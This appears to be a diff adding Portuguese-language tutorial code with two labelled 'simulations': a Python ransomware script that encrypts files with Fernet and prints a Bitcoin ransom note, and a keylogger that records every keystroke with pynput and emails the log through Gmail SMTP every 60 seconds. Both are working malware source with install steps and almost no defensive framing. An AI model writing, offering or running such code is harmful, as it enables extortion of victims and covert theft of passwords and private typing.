@@ -1,0 +1,128 @@
+import os
+from cryptography.fernet import Fernet
+
+# Gera uma chave e salva em um arquivo
+def gerar_chave():
+    chave = Fernet.generate_key()
+    with open("chave.key", "wb") as chave_file:
+        chave_file.write(chave)
+
+# Carrega a chave
+def carregar_chave():
+    return open("chave.key", "rb").read()
+
+# Criptografa um arquivo
+def criptografar_arquivo(nome_arquivo):
+    chave = carregar_chave()
+    f = Fernet(chave)
+    with open(nome_arquivo, "rb") as file:
+        file_data = file.read()
+    encrypted_data = f.encrypt(file_data)
+    with open(nome_arquivo, "wb") as file:
+        file.write(encrypted_data)
+
+# Descriptografa um arquivo
+def descriptografar_arquivo(nome_arquivo):
+    chave = carregar_chave()
+    f = Fernet(chave)
+    with open(nome_arquivo, "rb") as file:
+        encrypted_data = file.read()
+    decrypted_data = f.decrypt(encrypted_data)
+    with open(nome_arquivo, "wb") as file:
+        file.write(decrypted_data)
+
+# Mensagem de resgate
+def mensagem_resgate():
+    print("""
+    ⚠️ Seus arquivos foram criptografados!
+    Para recuperá-los, envie 1 Bitcoin para o endereço: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
+    """)
+
+# Exemplo de uso
+if __name__ == "__main__":
+    # Gerar chave (executar apenas uma vez)
+    # gerar_chave()
+
+    # Criptografar arquivos
+    criptografar_arquivo("~/ransomware_test/documento1.txt")
+    criptografar_arquivo("~/ransomware_test/documento2.txt")
+
+    # Exibir mensagem de resgate
+    mensagem_resgate()
+
+    # Descriptografar arquivos (após pagamento simulado)
+    # descriptografar_arquivo("~/ransomware_test/documento1.txt")
+    # descriptografar_arquivo("~/ransomware_test/documento2.txt")
+📦 Dependências
+Instale a biblioteca cryptography:
+
+bash
+
+
+
+pip install cryptography
+2. 🕵️ Keylogger Simulado
+📝 Script de Captura de Teclas
+keylogger_sim.py
+python
+
+
+
+import pynput
+from pynput.keyboard import Key, Listener
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+import time
+
+# Arquivo para salvar as teclas
+log_file = "keylog.txt"
+
+# Função para registrar teclas
+def on_press(key):
+    with open(log_file, "a") as f:
+        f.write(f"{key}\n")
+
+# Enviar e-mail com o log
+def enviar_email():
+    remetente = "seu_email@gmail.com"
+    senha = "sua_senha"
+    destinatario = "destinatario@gmail.com"
+
+    msg = MIMEMultipart()
+    msg['From'] = remetente
+    msg['To'] = destinatario
+    msg['Subject'] = "Keylogger Log"
+
+    with open(log_file, "r") as f:
+        corpo = f.read()
+
+    msg.attach(MIMEText(corpo, 'plain'))
+
+    server = smtplib.SMTP('smtp.gmail.com', 587)
+    server.starttls()
+    server.login(remetente, senha)
+    texto = msg.as_string()
+    server.sendmail(remetente, destinatario, texto)
+    server.quit()
+
+# Listener de teclas
+def iniciar_keylogger():
+    with Listener(on_press=on_press) as listener:
+        listener.join()
+
+# Enviar log a cada 60 segundos
+def enviar_log_periodicamente():
+    while True:
+        time.sleep(60)
+        enviar_email()
+
+# Exemplo de uso
+if __name__ == "__main__":
+    import threading
+    # Iniciar keylogger em uma thread separada
+    keylogger_thread = threading.Thread(target=iniciar_keylogger)
+    keylogger_thread.start()
+
+    # Enviar logs periodicamente
+    enviar_log_periodicamente()
